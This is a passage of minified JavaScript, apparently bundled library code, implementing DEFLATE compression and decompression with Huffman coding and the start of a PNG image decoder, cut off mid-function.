          s = n.F.U,
          a = n.F._goodIndex;
        n.F._hash;
        var u = n.F._putsE,
          c = 0,
          l = r << 3,
          d = 0,
          f = t.length;
        if (0 == o) {
          for (; c < f; )
            u(e, l, c + (S = Math.min(65535, f - c)) == f ? 1 : 0),
              (l = n.F._copyExact(t, c, S, e, l + 8)),
              (c += S);
          return l >>> 3;
        }
        var h = s.lits,
          p = s.strt,
          m = s.prev,
          g = 0,
          y = 0,
          w = 0,
          b = 0,
          v = 0,
          A = 0;
        for (f > 2 && (p[(A = n.F._hash(t, 0))] = 0), c = 0; c < f; c++) {
          if (((v = A), c + 1 < f - 2)) {
            A = n.F._hash(t, c + 1);
            var k = (c + 1) & 32767;
            (m[k] = p[A]), (p[A] = k);
          }
          if (d <= c) {
            (g > 14e3 || y > 26697) &&
              f - c > 100 &&
              (d < c && ((h[g] = c - d), (g += 2), (d = c)),
              (l = n.F._writeBlock(
                c == f - 1 || d == f ? 1 : 0,
                h,
                g,
                b,
                t,
                w,
                c - w,
                e,
                l
              )),
              (g = y = b = 0),
              (w = c));
            var I = 0;
            c < f - 2 &&
              (I = n.F._bestMatch(t, c, m, v, Math.min(i[2], f - c), i[3]));
            var S = I >>> 16,
              _ = 65535 & I;
            if (0 != I) {
              _ = 65535 & I;
              var T = a((S = I >>> 16), s.of0);
              s.lhst[257 + T]++;
              var B = a(_, s.df0);
              s.dhst[B]++,
                (b += s.exb[T] + s.dxb[B]),
                (h[g] = (S << 23) | (c - d)),
                (h[g + 1] = (_ << 16) | (T << 8) | B),
                (g += 2),
                (d = c + S);
            } else s.lhst[t[c]]++;
            y++;
          }
        }
        for (
          (w == c && 0 != t.length) ||
          (d < c && ((h[g] = c - d), (g += 2), (d = c)),
          (l = n.F._writeBlock(1, h, g, b, t, w, c - w, e, l)),
          (g = 0),
          (y = 0),
          (g = y = b = 0),
          (w = c));
          7 & l;

        )
          l++;
        return l >>> 3;
      }),
      (n.F._bestMatch = function (t, e, r, o, i, s) {
        var a = 32767 & e,
          u = r[a],
          c = (a - u + 32768) & 32767;
        if (u == a || o != n.F._hash(t, e - c)) return 0;
        for (
          var l = 0, d = 0, f = Math.min(32767, e);
          c <= f && 0 != --s && u != a;

        ) {
          if (0 == l || t[e + l] == t[e + l - c]) {
            var h = n.F._howLong(t, e, c);
            if (h > l) {
              if (((d = c), (l = h) >= i)) break;
              c + 2 < h && (h = c + 2);
              for (var p = 0, m = 0; m < h - 2; m++) {
                var g = (e - c + m + 32768) & 32767,
                  y = (g - r[g] + 32768) & 32767;
                y > p && ((p = y), (u = g));
              }
            }
          }
          c += ((a = u) - (u = r[a]) + 32768) & 32767;
        }
        return (l << 16) | d;
      }),
      (n.F._howLong = function (t, e, n) {
        if (
          t[e] != t[e - n] ||
          t[e + 1] != t[e + 1 - n] ||
          t[e + 2] != t[e + 2 - n]
        )
          return 0;
        var r = e,
          o = Math.min(t.length, e + 258);
        for (e += 3; e < o && t[e] == t[e - n]; ) e++;
        return e - r;
      }),
      (n.F._hash = function (t, e) {
        return (((t[e] << 8) | t[e + 1]) + (t[e + 2] << 4)) & 65535;
      }),
      (n.saved = 0),
      (n.F._writeBlock = function (t, e, r, o, i, s, a, u, c) {
        var l,
          d,
          f,
          h,
          p,
          m,
          g,
          y,
          w,
          b = n.F.U,
          v = n.F._putsF,
          A = n.F._putsE;
        b.lhst[256]++,
          (d = (l = n.F.getTrees())[0]),
          (f = l[1]),
          (h = l[2]),
          (p = l[3]),
          (m = l[4]),
          (g = l[5]),
          (y = l[6]),
          (w = l[7]);
        var k = 32 + ((c + 3) & 7 ? 8 - ((c + 3) & 7) : 0) + (a << 3),
          I =
            o + n.F.contSize(b.fltree, b.lhst) + n.F.contSize(b.fdtree, b.dhst),
          S = o + n.F.contSize(b.ltree, b.lhst) + n.F.contSize(b.dtree, b.dhst);
        S +=
          14 +
          3 * g +
          n.F.contSize(b.itree, b.ihst) +
          (2 * b.ihst[16] + 3 * b.ihst[17] + 7 * b.ihst[18]);
        for (var _ = 0; _ < 286; _++) b.lhst[_] = 0;
        for (_ = 0; _ < 30; _++) b.dhst[_] = 0;
        for (_ = 0; _ < 19; _++) b.ihst[_] = 0;
        var T = k < I && k < S ? 0 : I < S ? 1 : 2;
        if ((v(u, c, t), v(u, c + 1, T), (c += 3), 0 == T)) {
          for (; 7 & c; ) c++;
          c = n.F._copyExact(i, s, a, u, c);
        } else {
          var B, C;
          if ((1 == T && ((B = b.fltree), (C = b.fdtree)), 2 == T)) {
            n.F.makeCodes(b.ltree, d),
              n.F.revCodes(b.ltree, d),
              n.F.makeCodes(b.dtree, f),
              n.F.revCodes(b.dtree, f),
              n.F.makeCodes(b.itree, h),
              n.F.revCodes(b.itree, h),
              (B = b.ltree),
              (C = b.dtree),
              A(u, c, p - 257),
              A(u, (c += 5), m - 1),
              A(u, (c += 5), g - 4),
              (c += 4);
            for (var E = 0; E < g; E++)
              A(u, c + 3 * E, b.itree[1 + (b.ordr[E] << 1)]);
            (c += 3 * g),
              (c = n.F._codeTiny(y, b.itree, u, c)),
              (c = n.F._codeTiny(w, b.itree, u, c));
          }
          for (var x = s, P = 0; P < r; P += 2) {
            for (var O = e[P], R = O >>> 23, M = x + (8388607 & O); x < M; )
              c = n.F._writeLit(i[x++], B, u, c);
            if (0 != R) {
              var L = e[P + 1],
                N = L >> 16,
                D = (L >> 8) & 255,
                U = 255 & L;
              A(u, (c = n.F._writeLit(257 + D, B, u, c)), R - b.of0[D]),
                (c += b.exb[D]),
                v(u, (c = n.F._writeLit(U, C, u, c)), N - b.df0[U]),
                (c += b.dxb[U]),
                (x += R);
            }
          }
          c = n.F._writeLit(256, B, u, c);
        }
        return c;
      }),
      (n.F._copyExact = function (t, e, n, r, o) {
        var i = o >>> 3;
        return (
          (r[i] = n),
          (r[i + 1] = n >>> 8),
          (r[i + 2] = 255 - r[i]),
          (r[i + 3] = 255 - r[i + 1]),
          (i += 4),
          r.set(new Uint8Array(t.buffer, e, n), i),
          o + ((n + 4) << 3)
        );
      }),
      (n.F.getTrees = function () {
        for (
          var t = n.F.U,
            e = n.F._hufTree(t.lhst, t.ltree, 15),
            r = n.F._hufTree(t.dhst, t.dtree, 15),
            o = [],
            i = n.F._lenCodes(t.ltree, o),
            s = [],
            a = n.F._lenCodes(t.dtree, s),
            u = 0;
          u < o.length;
          u += 2
        )
          t.ihst[o[u]]++;
        for (u = 0; u < s.length; u += 2) t.ihst[s[u]]++;
        for (
          var c = n.F._hufTree(t.ihst, t.itree, 7), l = 19;
          l > 4 && 0 == t.itree[1 + (t.ordr[l - 1] << 1)];

        )
          l--;
        return [e, r, c, i, a, l, o, s];
      }),
      (n.F.getSecond = function (t) {
        for (var e = [], n = 0; n < t.length; n += 2) e.push(t[n + 1]);
        return e;
      }),
      (n.F.nonZero = function (t) {
        for (var e = "", n = 0; n < t.length; n += 2)
          0 != t[n + 1] && (e += (n >> 1) + ",");
        return e;
      }),
      (n.F.contSize = function (t, e) {
        for (var n = 0, r = 0; r < e.length; r++) n += e[r] * t[1 + (r << 1)];
        return n;
      }),
      (n.F._codeTiny = function (t, e, r, o) {
        for (var i = 0; i < t.length; i += 2) {
          var s = t[i],
            a = t[i + 1];
          o = n.F._writeLit(s, e, r, o);
          var u = 16 == s ? 2 : 17 == s ? 3 : 7;
          s > 15 && (n.F._putsE(r, o, a, u), (o += u));
        }
        return o;
      }),
      (n.F._lenCodes = function (t, e) {
        for (var n = t.length; 2 != n && 0 == t[n - 1]; ) n -= 2;
        for (var r = 0; r < n; r += 2) {
          var o = t[r + 1],
            i = r + 3 < n ? t[r + 3] : -1,
            s = r + 5 < n ? t[r + 5] : -1,
            a = 0 == r ? -1 : t[r - 1];
          if (0 == o && i == o && s == o) {
            for (var u = r + 5; u + 2 < n && t[u + 2] == o; ) u += 2;
            (c = Math.min((u + 1 - r) >>> 1, 138)) < 11
              ? e.push(17, c - 3)
              : e.push(18, c - 11),
              (r += 2 * c - 2);
          } else if (o == a && i == o && s == o) {
            for (u = r + 5; u + 2 < n && t[u + 2] == o; ) u += 2;
            var c = Math.min((u + 1 - r) >>> 1, 6);
            e.push(16, c - 3), (r += 2 * c - 2);
          } else e.push(o, 0);
        }
        return n >>> 1;
      }),
      (n.F._hufTree = function (t, e, r) {
        var o = [],
          i = t.length,
          s = e.length,
          a = 0;
        for (a = 0; a < s; a += 2) (e[a] = 0), (e[a + 1] = 0);
        for (a = 0; a < i; a++) 0 != t[a] && o.push({ lit: a, f: t[a] });
        var u = o.length,
          c = o.slice(0);
        if (0 == u) return 0;
        if (1 == u) {
          var l = o[0].lit;
          return (
            (c = 0 == l ? 1 : 0),
            (e[1 + (l << 1)] = 1),
            (e[1 + (c << 1)] = 1),
            1
          );
        }
        o.sort(function (t, e) {
          return t.f - e.f;
        });
        var d = o[0],
          f = o[1],
          h = 0,
          p = 1,
          m = 2;
        for (o[0] = { lit: -1, f: d.f + f.f, l: d, r: f, d: 0 }; p != u - 1; )
          (d = h != p && (m == u || o[h].f < o[m].f) ? o[h++] : o[m++]),
            (f = h != p && (m == u || o[h].f < o[m].f) ? o[h++] : o[m++]),
            (o[p++] = { lit: -1, f: d.f + f.f, l: d, r: f });
        var g = n.F.setDepth(o[p - 1], 0);
        for (g > r && (n.F.restrictDepth(c, r, g), (g = r)), a = 0; a < u; a++)
          e[1 + (c[a].lit << 1)] = c[a].d;
        return g;
      }),
      (n.F.setDepth = function (t, e) {
        return -1 != t.lit
          ? ((t.d = e), e)
          : Math.max(n.F.setDepth(t.l, e + 1), n.F.setDepth(t.r, e + 1));
      }),
      (n.F.restrictDepth = function (t, e, n) {
        var r = 0,
          o = 1 << (n - e),
          i = 0;
        for (
          t.sort(function (t, e) {
            return e.d == t.d ? t.f - e.f : e.d - t.d;
          }),
            r = 0;
          r < t.length && t[r].d > e;
          r++
        ) {
          var s = t[r].d;
          (t[r].d = e), (i += o - (1 << (n - s)));
        }
        for (i >>>= n - e; i > 0; )
          (s = t[r].d) < e ? (t[r].d++, (i -= 1 << (e - s - 1))) : r++;
        for (; r >= 0; r--) t[r].d == e && i < 0 && (t[r].d--, i++);
        0 != i, 0;
      }),
      (n.F._goodIndex = function (t, e) {
        var n = 0;
        return (
          e[16 | n] <= t && (n |= 16),
          e[8 | n] <= t && (n |= 8),
          e[4 | n] <= t && (n |= 4),
          e[2 | n] <= t && (n |= 2),
          e[1 | n] <= t && (n |= 1),
          n
        );
      }),
      (n.F._writeLit = function (t, e, r, o) {
        return n.F._putsF(r, o, e[t << 1]), o + e[1 + (t << 1)];
      }),
      (n.F.inflate = function (t, e) {
        var r = Uint8Array;
        if (3 == t[0] && 0 == t[1]) return e || new r(0);
        var o = n.F,
          i = o._bitsF,
          s = o._bitsE,
          a = o._decodeTiny,
          u = o.makeCodes,
          c = o.codes2map,
          l = o._get17,
          d = o.U,
          f = null == e;
        f && (e = new r((t.length >>> 2) << 3));
        for (
          var h,
            p,
            m = 0,
            g = 0,
            y = 0,
            w = 0,
            b = 0,
            v = 0,
            A = 0,
            k = 0,
            I = 0;
          0 == m;

        )
          if (((m = i(t, I, 1)), (g = i(t, I + 1, 2)), (I += 3), 0 != g)) {
            if (
              (f && (e = n.F._check(e, k + (1 << 17))),
              1 == g && ((h = d.flmap), (p = d.fdmap), (v = 511), (A = 31)),
              2 == g)
            ) {
              (y = s(t, I, 5) + 257),
                (w = s(t, I + 5, 5) + 1),
                (b = s(t, I + 10, 4) + 4),
                (I += 14);
              for (var S = 0; S < 38; S += 2)
                (d.itree[S] = 0), (d.itree[S + 1] = 0);
              var _ = 1;
              for (S = 0; S < b; S++) {
                var T = s(t, I + 3 * S, 3);
                (d.itree[1 + (d.ordr[S] << 1)] = T), T > _ && (_ = T);
              }
              (I += 3 * b),
                u(d.itree, _),
                c(d.itree, _, d.imap),
                (h = d.lmap),
                (p = d.dmap),
                (I = a(d.imap, (1 << _) - 1, y + w, t, I, d.ttree));
              var B = o._copyOut(d.ttree, 0, y, d.ltree);
              v = (1 << B) - 1;
              var C = o._copyOut(d.ttree, y, w, d.dtree);
              (A = (1 << C) - 1),
                u(d.ltree, B),
                c(d.ltree, B, h),
                u(d.dtree, C),
                c(d.dtree, C, p);
            }
            for (;;) {
              var E = h[l(t, I) & v];
              I += 15 & E;
              var x = E >>> 4;
              if (x >>> 8 == 0) e[k++] = x;
              else {
                if (256 == x) break;
                var P = k + x - 254;
                if (x > 264) {
                  var O = d.ldef[x - 257];
                  (P = k + (O >>> 3) + s(t, I, 7 & O)), (I += 7 & O);
                }
                var R = p[l(t, I) & A];
                I += 15 & R;
                var M = R >>> 4,
                  L = d.ddef[M],
                  N = (L >>> 4) + i(t, I, 15 & L);
                for (
                  I += 15 & L, f && (e = n.F._check(e, k + (1 << 17)));
                  k < P;

                )
                  (e[k] = e[k++ - N]),
                    (e[k] = e[k++ - N]),
                    (e[k] = e[k++ - N]),
                    (e[k] = e[k++ - N]);
                k = P;
              }
            }
          } else {
            7 & I && (I += 8 - (7 & I));
            var D = 4 + (I >>> 3),
              U = t[D - 4] | (t[D - 3] << 8);
            f && (e = n.F._check(e, k + U)),
              e.set(new r(t.buffer, t.byteOffset + D, U), k),
              (I = (D + U) << 3),
              (k += U);
          }
        return e.length == k ? e : e.slice(0, k);
      }),
      (n.F._check = function (t, e) {
        var n = t.length;
        if (e <= n) return t;
        var r = new Uint8Array(Math.max(n << 1, e));
        return r.set(t, 0), r;
      }),
      (n.F._decodeTiny = function (t, e, r, o, i, s) {
        for (var a = n.F._bitsE, u = n.F._get17, c = 0; c < r; ) {
          var l = t[u(o, i) & e];
          i += 15 & l;
          var d = l >>> 4;
          if (d <= 15) (s[c] = d), c++;
          else {
            var f = 0,
              h = 0;
            16 == d
              ? ((h = 3 + a(o, i, 2)), (i += 2), (f = s[c - 1]))
              : 17 == d
              ? ((h = 3 + a(o, i, 3)), (i += 3))
              : 18 == d && ((h = 11 + a(o, i, 7)), (i += 7));
            for (var p = c + h; c < p; ) (s[c] = f), c++;
          }
        }
        return i;
      }),
      (n.F._copyOut = function (t, e, n, r) {
        for (var o = 0, i = 0, s = r.length >>> 1; i < n; ) {
          var a = t[i + e];
          (r[i << 1] = 0), (r[1 + (i << 1)] = a), a > o && (o = a), i++;
        }
        for (; i < s; ) (r[i << 1] = 0), (r[1 + (i << 1)] = 0), i++;
        return o;
      }),
      (n.F.makeCodes = function (t, e) {
        for (
          var r, o, i, s, a = n.F.U, u = t.length, c = a.bl_count, l = 0;
          l <= e;
          l++
        )
          c[l] = 0;
        for (l = 1; l < u; l += 2) c[t[l]]++;
        var d = a.next_code;
        for (r = 0, c[0] = 0, o = 1; o <= e; o++)
          (r = (r + c[o - 1]) << 1), (d[o] = r);
        for (i = 0; i < u; i += 2)
          0 != (s = t[i + 1]) && ((t[i] = d[s]), d[s]++);
      }),
      (n.F.codes2map = function (t, e, r) {
        for (var o = t.length, i = n.F.U.rev15, s = 0; s < o; s += 2)
          if (0 != t[s + 1])
            for (
              var a = s >> 1,
                u = t[s + 1],
                c = (a << 4) | u,
                l = e - u,
                d = t[s] << l,
                f = d + (1 << l);
              d != f;

            )
              (r[i[d] >>> (15 - e)] = c), d++;
      }),
      (n.F.revCodes = function (t, e) {
        for (var r = n.F.U.rev15, o = 15 - e, i = 0; i < t.length; i += 2) {
          var s = t[i] << (e - t[i + 1]);
          t[i] = r[s] >>> o;
        }
      }),
      (n.F._putsE = function (t, e, n) {
        n <<= 7 & e;
        var r = e >>> 3;
        (t[r] |= n), (t[r + 1] |= n >>> 8);
      }),
      (n.F._putsF = function (t, e, n) {
        n <<= 7 & e;
        var r = e >>> 3;
        (t[r] |= n), (t[r + 1] |= n >>> 8), (t[r + 2] |= n >>> 16);
      }),
      (n.F._bitsE = function (t, e, n) {
        return (
          ((t[e >>> 3] | (t[1 + (e >>> 3)] << 8)) >>> (7 & e)) & ((1 << n) - 1)
        );
      }),
      (n.F._bitsF = function (t, e, n) {
        return (
          ((t[e >>> 3] | (t[1 + (e >>> 3)] << 8) | (t[2 + (e >>> 3)] << 16)) >>>
            (7 & e)) &
          ((1 << n) - 1)
        );
      }),
      (n.F._get17 = function (t, e) {
        return (
          (t[e >>> 3] | (t[1 + (e >>> 3)] << 8) | (t[2 + (e >>> 3)] << 16)) >>>
          (7 & e)
        );
      }),
      (n.F._get25 = function (t, e) {
        return (
          (t[e >>> 3] |
            (t[1 + (e >>> 3)] << 8) |
            (t[2 + (e >>> 3)] << 16) |
            (t[3 + (e >>> 3)] << 24)) >>>
          (7 & e)
        );
      }),
      (n.F.U =
        ((t = Uint16Array),
        (e = Uint32Array),
        {
          next_code: new t(16),
          bl_count: new t(16),
          ordr: [
            16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15,
          ],
          of0: [
            3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, 35, 43, 51,
            59, 67, 83, 99, 115, 131, 163, 195, 227, 258, 999, 999, 999,
          ],
          exb: [
            0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4, 4,
            4, 5, 5, 5, 5, 0, 0, 0, 0,
          ],
          ldef: new t(32),
          df0: [
            1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193, 257, 385,
            513, 769, 1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289, 16385,
            24577, 65535, 65535,
          ],
          dxb: [
            0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9,
            10, 10, 11, 11, 12, 12, 13, 13, 0, 0,
          ],
          ddef: new e(32),
          flmap: new t(512),
          fltree: [],
          fdmap: new t(32),
          fdtree: [],
          lmap: new t(32768),
          ltree: [],
          ttree: [],
          dmap: new t(32768),
          dtree: [],
          imap: new t(512),
          itree: [],
          rev15: new t(32768),
          lhst: new e(286),
          dhst: new e(30),
          ihst: new e(19),
          lits: new e(15e3),
          strt: new t(65536),
          prev: new t(32768),
        })),
      (function () {
        for (var t = n.F.U, e = 0; e < 32768; e++) {
          var r = e;
          (r =
            ((4278255360 &
              (r =
                ((4042322160 &
                  (r =
                    ((3435973836 &
                      (r =
                        ((2863311530 & r) >>> 1) | ((1431655765 & r) << 1))) >>>
                      2) |
                    ((858993459 & r) << 2))) >>>
                  4) |
                ((252645135 & r) << 4))) >>>
              8) |
            ((16711935 & r) << 8)),
            (t.rev15[e] = ((r >>> 16) | (r << 16)) >>> 17);
        }
        function o(t, e, n) {
          for (; 0 != e--; ) t.push(0, n);
        }
        for (e = 0; e < 32; e++)
          (t.ldef[e] = (t.of0[e] << 3) | t.exb[e]),
            (t.ddef[e] = (t.df0[e] << 4) | t.dxb[e]);
        o(t.fltree, 144, 8),
          o(t.fltree, 112, 9),
          o(t.fltree, 24, 7),
          o(t.fltree, 8, 8),
          n.F.makeCodes(t.fltree, 9),
          n.F.codes2map(t.fltree, 9, t.flmap),
          n.F.revCodes(t.fltree, 9),
          o(t.fdtree, 32, 5),
          n.F.makeCodes(t.fdtree, 5),
          n.F.codes2map(t.fdtree, 5, t.fdmap),
          n.F.revCodes(t.fdtree, 5),
          o(t.itree, 19, 0),
          o(t.ltree, 286, 0),
          o(t.dtree, 30, 0),
          o(t.ttree, 320, 0);
      })();
  })();
  var iO = (function (t, e) {
    return (
      e.forEach(function (e) {
        e &&
          "string" != typeof e &&
          !Array.isArray(e) &&
          Object.keys(e).forEach(function (n) {
            if ("default" !== n && !(n in t)) {
              var r = Object.getOwnPropertyDescriptor(e, n);
              Object.defineProperty(
                t,
                n,
                r.get
                  ? r
                  : {
                      enumerable: !0,
                      get: function () {
                        return e[n];
                      },
                    }
              );
            }
          });
      }),
      Object.freeze(t)
    );
  })({ __proto__: null, default: rO }, [rO]);
  const sO = (function () {
    var t = {
      nextZero(t, e) {
        for (; 0 != t[e]; ) e++;
        return e;
      },
      readUshort: (t, e) => (t[e] << 8) | t[e + 1],
      writeUshort(t, e, n) {
        (t[e] = (n >> 8) & 255), (t[e + 1] = 255 & n);
      },
      readUint: (t, e) =>
        16777216 * t[e] + ((t[e + 1] << 16) | (t[e + 2] << 8) | t[e + 3]),
      writeUint(t, e, n) {
        (t[e] = (n >> 24) & 255),
          (t[e + 1] = (n >> 16) & 255),
          (t[e + 2] = (n >> 8) & 255),
          (t[e + 3] = 255 & n);
      },
      readASCII(t, e, n) {
        let r = "";
        for (let o = 0; o < n; o++) r += String.fromCharCode(t[e + o]);
        return r;
      },
      writeASCII(t, e, n) {
        for (let r = 0; r < n.length; r++) t[e + r] = n.charCodeAt(r);
      },
      readBytes(t, e, n) {
        const r = [];
        for (let o = 0; o < n; o++) r.push(t[e + o]);
        return r;
      },
      pad: (t) => (t.length < 2 ? `0${t}` : t),
      readUTF8(e, n, r) {
        let o,
          i = "";
        for (let a = 0; a < r; a++) i += `%${t.pad(e[n + a].toString(16))}`;
        try {
          o = decodeURIComponent(i);
        } catch (s) {
          return t.readASCII(e, n, r);
        }
        return o;
      },
    };
    function e(e, n, r, o) {
      const s = n * r,
        a = i(o),
        u = Math.ceil((n * a) / 8),
        c = new Uint8Array(4 * s),
        l = new Uint32Array(c.buffer),
        { ctype: d } = o,
        { depth: f } = o,
        h = t.readUshort;
      if (6 == d) {
        const t = s << 2;
        if (8 == f)
          for (var p = 0; p < t; p += 4)
            (c[p] = e[p]),
              (c[p + 1] = e[p + 1]),
              (c[p + 2] = e[p + 2]),
              (c[p + 3] = e[p + 3]);
        if (16 == f) for (p = 0; p < t; p++) c[p] = e[p << 1];
      } else if (2 == d) {
        const t = o.tabs.tRNS;
        if (null == t) {
          if (8 == f)
            for (p = 0; p < s; p++) {
              var m = 3 * p;
              l[p] = (255 << 24) | (e[m + 2] << 16) | (e[m + 1] << 8) | e[m];
            }
          if (16 == f)
            for (p = 0; p < s; p++)
              (m = 6 * p),
                (l[p] =
                  (255 << 24) | (e[m + 4] << 16) | (e[m + 2] << 8) | e[m]);
        } else {
          var g = t[0];
          const n = t[1],
            r = t[2];
          if (8 == f)
            for (p = 0; p < s; p++) {
              var y = p << 2;
              (m = 3 * p),
                (l[p] =
                  (255 << 24) | (e[m + 2] << 16) | (e[m + 1] << 8) | e[m]),
                e[m] == g && e[m + 1] == n && e[m + 2] == r && (c[y + 3] = 0);
            }
          if (16 == f)
            for (p = 0; p < s; p++)
              (y = p << 2),
                (m = 6 * p),
                (l[p] =
                  (255 << 24) | (e[m + 4] << 16) | (e[m + 2] << 8) | e[m]),
                h(e, m) == g &&
                  h(e, m + 2) == n &&
                  h(e, m + 4) == r &&
                  (c[y + 3] = 0);
        }
      } else if (3 == d) {
        const t = o.tabs.PLTE,
          i = o.tabs.tRNS,
          a = i ? i.length : 0;
        if (1 == f)
          for (var w = 0; w < r; w++) {
            var b = w * u,
              v = w * n;
            for (p = 0; p < n; p++) {
              y = (v + p) << 2;
              var A = 3 * (k = (e[b + (p >> 3)] >> (7 - (7 & p))) & 1);
              (c[y] = t[A]),
                (c[y + 1] = t[A + 1]),
                (c[y + 2] = t[A + 2]),
                (c[y + 3] = k < a ? i[k] : 255);
            }
          }
        if (2 == f)
          for (w = 0; w < r; w++)
            for (b = w * u, v = w * n, p = 0; p < n; p++)
              (y = (v + p) << 2),
                (A = 3 * (k = (e[b + (p >> 2)] >> (6 - ((3 & p) << 1))) & 3)),
                (c[y] = t[A]),
                (c[y + 1] = t[A + 1]),
                (c[y + 2] = t[A + 2]),
                (c[y + 3] = k < a ? i[k] : 255);
        if (4 == f)
          for (w = 0; w < r; w++)
            for (b = w * u, v = w * n, p = 0; p < n; p++)
              (y = (v + p) << 2),
                (A = 3 * (k = (e[b + (p >> 1)] >> (4 - ((1 & p) << 2))) & 15)),
                (c[y] = t[A]),
                (c[y + 1] = t[A + 1]),
                (c[y + 2] = t[A + 2]),
                (c[y + 3] = k < a ? i[k] : 255);
        if (8 == f)
          for (p = 0; p < s; p++) {
            var k;
            (y = p << 2),
              (A = 3 * (k = e[p])),
              (c[y] = t[A]),
              (c[y + 1] = t[A + 1]),
              (c[y + 2] = t[A + 2]),
              (c[y + 3] = k < a ? i[k] : 255);
          }
      } else if (4 == d) {
        if (8 == f)
          for (p = 0; p < s; p++) {
            y = p << 2;
            var I = e[(S = p << 1)];
            (c[y] = I), (c[y + 1] = I), (c[y + 2] = I), (c[y + 3] = e[S + 1]);
          }
        if (16 == f)
          for (p = 0; p < s; p++) {
            var S;
            (y = p << 2),
              (I = e[(S = p << 2)]),
              (c[y] = I),
              (c[y + 1] = I),
              (c[y + 2] = I),
              (c[y + 3] = e[S + 2]);
          }
      } else if (0 == d)
        for (g = o.tabs.tRNS ? o.tabs.tRNS : -1, w = 0; w < r; w++) {
          const t = w * u,
            r = w * n;
          if (1 == f)
            for (var _ = 0; _ < n; _++) {
              var T =
                (I = 255 * ((e[t + (_ >>> 3)] >>> (7 - (7 & _))) & 1)) ==
                255 * g
                  ? 0
                  : 255;
              l[r + _] = (T << 24) | (I << 16) | (I << 8) | I;
            }
          else if (2 == f)
            for (_ = 0; _ < n; _++)
              (T =
                (I = 85 * ((e[t + (_ >>> 2)] >>> (6 - ((3 & _) << 1))) & 3)) ==
                85 * g
                  ? 0
                  : 255),
                (l[r + _] = (T << 24) | (I << 16) | (I << 8) | I);
          else if (4 == f)
            for (_ = 0; _ < n; _++)
              (T =
                (I = 17 * ((e[t + (_ >>> 1)] >>> (4 - ((1 & _) << 2))) & 15)) ==
                17 * g
                  ? 0
                  : 255),
                (l[r + _] = (T << 24) | (I << 16) | (I << 8) | I);
          else if (8 == f)
            for (_ = 0; _ < n; _++)
              (T = (I = e[t + _]) == g ? 0 : 255),
                (l[r + _] = (T << 24) | (I << 16) | (I << 8) | I);
          else if (16 == f)
            for (_ = 0; _ < n; _++)
              (I = e[t + (_ << 1)]),
                (T = h(e, t + (_ << 1)) == g ? 0 : 255),
                (l[r + _] = (T << 24) | (I << 16) | (I << 8) | I);
        }
      return c;
    }
    function n(t, e, n, a) {
      const u = i(t),
        c = Math.ceil((n * u) / 8),
        l = new Uint8Array((c + 1 + t.interlace) * a);
      return (
        (e = t.tabs.CgBI ? o(e, l) : r(e, l)),
        0 == t.interlace
          ? (e = s(e, t, 0, n, a))
          : 1 == t.interlace &&
            (e = (function (t, e) {
              const n = e.width,
                r = e.height,
                o = i(e),
                a = o >> 3,
                u = Math.ceil((n * o) / 8),
                c = new Uint8Array(r * u);
              let l = 0;
              const d = [0, 0, 4, 0, 2, 0, 1],
                f = [0, 4, 0, 2, 0, 1, 0],
                h = [8, 8, 8, 4, 4, 2, 2],
                p = [8, 8, 4, 4, 2, 2, 1];
              let m = 0;
              for (; m < 7; ) {
                const i = h[m],
                  y = p[m];
                let w = 0,
                  b = 0,
                  v = d[m];
                for (; v < r; ) (v += i), b++;
                let A = f[m];
                for (; A < n; ) (A += y), w++;
                const k = Math.ceil((w * o) / 8);
                s(t, e, l, w, b);
                let I = 0,
                  S = d[m];
                for (; S < r; ) {
                  let e = f[m],
                    r = (l + I * k) << 3;
                  for (; e < n; ) {
                    var g;
                    if (
                      (1 == o &&
                        ((g = ((g = t[r >> 3]) >> (7 - (7 & r))) & 1),
                        (c[S * u + (e >> 3)] |= g << (7 - (7 & e)))),
                      2 == o &&
                        ((g = ((g = t[r >> 3]) >> (6 - (7 & r))) & 3),
                        (c[S * u + (e >> 2)] |= g << (6 - ((3 & e) << 1)))),
                      4 == o &&
                        ((g = ((g = t[r >> 3]) >> (4 - (7 & r))) & 15),
                        (c[S * u + (e >> 1)] |= g << (4 - ((1 & e) << 2)))),
                      o >= 8)
                    ) {
                      const n = S * u + e * a;
                      for (let e = 0; e < a; e++) c[n + e] = t[(r >> 3) + e];
                    }
                    (r += o), (e += y);
                  }
                  I++, (S += i);
                }
                w * b != 0 && (l += b * (1 + k)), (m += 1);
              }
              return c;
            })(e, t)),
        e
      );
    }
    function r(t, e) {
      return o(new Uint8Array(t.buffer, 2, t.length - 6), e);
    }
    var o = (function () {
      const t = { H: {} };
      return (
        (t.H.N = function (e, n) {
          const r = Uint8Array;
          let o,
            i,
            s = 0,
            a = 0,
            u = 0,
            c = 0,
            l = 0,
            d = 0,
            f = 0,
            h = 0,
            p = 0;
          if (3 == e[0] && 0 == e[1]) return n || new r(0);
          const m = t.H,
            g = m.b,
            y = m.e,
            w = m.R,
            b = m.n,
            v = m.A,
            A = m.Z,
            k = m.m,
            I = null == n;
          for (I && (n = new r((e.length >>> 2) << 5)); 0 == s; )
            if (((s = g(e, p, 1)), (a = g(e, p + 1, 2)), (p += 3), 0 != a)) {
              if (
                (I && (n = t.H.W(n, h + (1 << 17))),
                1 == a && ((o = k.J), (i = k.h), (d = 511), (f = 31)),
                2 == a)
              ) {
                (u = y(e, p, 5) + 257),
                  (c = y(e, p + 5, 5) + 1),
                  (l = y(e, p + 10, 4) + 4),
                  (p += 14);
                let t = 1;
                for (var S = 0; S < 38; S += 2) (k.Q[S] = 0), (k.Q[S + 1] = 0);
                for (S = 0; S < l; S++) {
                  const n = y(e, p + 3 * S, 3);
                  (k.Q[1 + (k.X[S] << 1)] = n), n > t && (t = n);
                }
                (p += 3 * l),
                  b(k.Q, t),
                  v(k.Q, t, k.u),
                  (o = k.w),
                  (i = k.d),
                  (p = w(k.u, (1 << t) - 1, u + c, e, p, k.v));
                const n = m.V(k.v, 0, u, k.C);
                d = (1 << n) - 1;
                const r = m.V(k.v, u, c, k.D);
                (f = (1 << r) - 1),
                  b(k.C, n),
                  v(k.C, n, o),
                  b(k.D, r),
                  v(k.D, r, i);
              }
              for (;;) {
